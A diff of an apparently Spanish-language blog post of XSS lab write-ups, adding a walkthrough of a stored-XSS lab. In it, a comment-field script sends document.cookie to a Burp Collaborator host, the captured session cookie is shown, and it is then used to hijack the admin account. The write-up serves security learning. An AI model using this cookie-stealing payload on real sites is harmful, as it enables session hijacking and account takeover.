@@ -999,7 +999,9 @@ Así que por eso verifica si es igual a 4, ya que quiere saber si la solicitud e
 
 Pero como vemos de nuevo:
 
-`if (this.readyState == 4 && this.status == 200) {`
+```js
+if (this.readyState == 4 && this.status == 200) {
+```
 
 Vemos que no solo comprueba que este lista, si no que tambien verifica el estado de respuesta del servidor es 200, que como sabemos significa que la consulta se realizo correctamente, entonces en caso de que abmas condiciones se cumplan, entonces se ejecutará lo siguiente que es:
 
@@ -1324,7 +1326,7 @@ Como dije que eran 2 partes las que llamaron nuestra atención esta es la segund
     }
 ```
 
-Así que primero esta función recibe el valor string **html** que este valor debe contener los comentarios que se dan como entrada, y lo primero que hace es usar **return**, para devolver el valor de **html**, pero lo devolvera modificado, ya que primero usará la función **replace()** que lo que va a cambiar son los caracteres **<** y **>** por sus valores de entidades HTML, las cuales son **&lt** y **&gt**, esto se hace con el fin de que si en la entrada del comentario estan estos 2 caracteres, no se interpreten como código, y no pueda haber un XSS en teoria.
+Así que primero esta función recibe el valor string **html** que este valor contiene el HTML de la web, incluidos los comentarios que se dan como entrada, y lo primero que hace es usar **return**, para devolver el valor de **html**, pero lo devolvera modificado, ya que primero usará la función **replace()** que lo que va a cambiar son los caracteres **<** y **>** por sus valores de entidades HTML, las cuales son **&lt** y **&gt**, esto se hace con el fin de que si en la entrada del comentario estan estos 2 caracteres, no se interpreten como código, y no pueda haber un XSS en teoria.
 
 Pero aquí hay un gran fallo, ya que cuando se usa la función **replace()** esta solo esta filtrando los primeros valores de esos caracteres que se ingresen, pero no los que siguen.
 
@@ -1353,3 +1355,110 @@ Y terminamos:
 ![end](/assets/images/XSS/lab13/end.png)
 
 <br>
+
+# Laboratorio 14: Exploiting cross-site scripting to steal cookies
+
+En este laboratorio nos dice lo siguiente:
+
+![lab14](/assets/images/XSS/lab14/lab14.png)
+
+Nos dice que existe una vulnerabilidad XSS stored(almacenada), en la sección de comentarios de la web, y que existe un usuario victima que lee todos los comentarios después de ser publicados, y dice que debemos encontrar la forma de robar la cookie de esa victima y suplantar la cookie de sesion para acceder a su cuenta.
+
+Al entrar a un post del laboratorio vemos lo siguiente:
+
+![comentarios](/assets/images/XSS/lab14/comentarios.png)
+
+Vemos la sección de comentarios y también que podemos publicar nuestro propio comentario.
+
+Así que publicaremos uno con etiquetas HTML para ver si nos las interpreta:
+
+![comentario](/assets/images/XSS/lab14/comentario.png)
+
+Y al publicarlo vemos que en efecto nos interpreto las etiquetas `<p></p>`:
+
+![publicado](/assets/images/XSS/lab14/publicado.png)
+
+Por lo que ahora quedaría enfocarnos en el objetivo que es robar las cookies del usuario externo que siempre lee los comentarios.
+
+<br>
+
+Para ello primero usaremos BurpCollaborator para iniciar un servidor tercero y ver si puede existir la comunicación entre lo que pongamos en la web que se interprete gracias a este XSS.
+
+Primero iniciamos el collaborator y damos click en **copy to clipboard** para obtener la dirección de ese servidor tercero:
+
+![collab](/assets/images/XSS/lab14/collaborator.png)
+
+Ahora intentaremos inyectar el siguiente código javascript en la sección de comentarios para ver si nos lo interpreta:
+
+![comment](/assets/images/XSS/lab14/comment.png)
+
+```js
+<script>
+fetch('https://lmbbiav1v62xqw7wp9ars2x8ezkr8g.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+
+Lo que hace el siguiente código javascript es lo siguiente:
+
+Primero usa las etiquetas **script** que sabemos que es para que lo que haya dentro de ahí sea interpretado con javascript.
+
+Después utiliza la función **fetch()** la cual esta función nos permite realizar peticiones, le pasamos la URL a la cual hará la petición que en este caso es nuestro servidor tercero de burpCollaborator, aunque en un caso real tendrias que montar un servidor tercero para recibir las respuestas de tus solicitudes.
+
+Y después configuraremos esa petición con los siguientes parametros:
+
+**method: 'POST'**
+
+Esto es para que la petición se tramite por el metodo POST, donde no se ven los datos en la URL.
+
+
+**mode 'no-cors'**
+
+Este parametro lo que hace es desactivar la función del **cors** que basicamente son reglas que en caso de comportamiento extraño el la solicitud esta no se tramitará para evitar riesgos de XSS ya que se le considerara como solicitud de origen cruzado, y esto verifica si el origen de la peticion coincide con el origen del recurso al que se accede, pero si la desactivamos como en este caso nos es de ventaja para evadir esas reglas y lograr nuestro objetivo.
+
+
+**body:document.cookie**
+Y esto lo que hace es mostrarnos todas las cookies en el contexto de la web actual, en el cuerpo de la petición para que sea visible al leer la petición en nuestro servidor tercero de BurpCollaborator y leer las cookies recibidas.
+
+<br>
+
+Una vez posteamos el comentario iremos al comentario y veremos lo siguiente:
+
+![nada](/assets/images/XSS/lab14/nada.png)
+
+Podemos apreciar que no se ve nada ya que esto significa que el código ha sido interpretado por la web en el contexto del navegador actual.
+
+Así que se supone que un usuario victima ya leyo este comentario, que en realidad con entrar al producto ya se estaría ejecutando el script.
+
+Así que si vamos a el servidor tercero de BurpCollaborator y damos en **pollNow** veremos lo siguiente:
+
+![http](/assets/images/XSS/lab14/HTTP.png)
+
+Vemos que recibimos la respuesta del servidor en el contexto del usuario que vio el comentario, en este caso la respuesta es como la configuramos, se tramita por HTTP dandonos la cookie de sesión como lo programamos en el XSS, y esta cookie de sesión obtenida del usuario que lee todos los comentarios es el valor:
+
+**session=GfcIhusZ0yuh9Mip8tBq3peYB1ET4IpY**
+
+Una vez tengamos la cookie de sesión de la victima, simplemente toca hacer el reemplazo de cookie de sesion para acceder a su cuenta.
+
+<br>
+
+En este caso haremos una petición a la ruta **Myaccount** de la web y la vamos a interceptar y veremos lo siguiente:
+
+![intercept](/assets/images/XSS/lab14/intercept.png)
+
+Así que vemos nuestra cookie de sesion en la petición, pero nosotros cambiaremos esa por la que recien obtuvimos del usuario que lee los comentarios, quedando así:
+
+![cookie](/assets/images/XSS/lab14/hijacking.png)
+
+Y hicimos esto ya que al reemplazar la cookie de sesión nuestra con la del usuario victima logramos suplantar su sesión y acceder a su cuenta sin necesidad de conocer la contraseña.
+
+una vez reemplazemos la cookie de sesión, simplemente tramitamos la petición, y al volver a la web vemos que estamos logueados como el usuario que leía los comentarios , en este caso era el admin y terminamos con este laboratorio:
+
+![end](/assets/images/XSS/lab14/end.png)
+
+<br>
+
+# 
